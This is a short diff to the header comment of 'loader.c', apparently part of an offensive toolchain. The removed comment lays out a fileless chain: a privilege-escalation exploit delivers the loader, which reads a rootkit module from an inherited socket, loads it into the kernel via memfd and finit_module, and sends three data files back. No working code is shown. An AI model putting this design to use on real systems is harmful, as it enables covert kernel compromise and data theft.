@@ -1,11 +1,5 @@
-/* loader.c - reflective rootkit loader + PIR exfiltration
- *
- * Runs in-memory, delivered by exploit_privesc via fexecve. CHAIN_FD (fd 3)
- * is the open socket inherited from stager — nothing touches disk.
- *
- * Reads rootkit.ko from CHAIN_FD via delivery frame, loads it into the
- * kernel via memfd + finit_module, then reads the three PIR files and
- * sends them back over CHAIN_FD with the same delivery framing.
+/* 
+ * loader.c - reflective rootkit loader + PIR exfiltration
  */
 
 #define _GNU_SOURCE
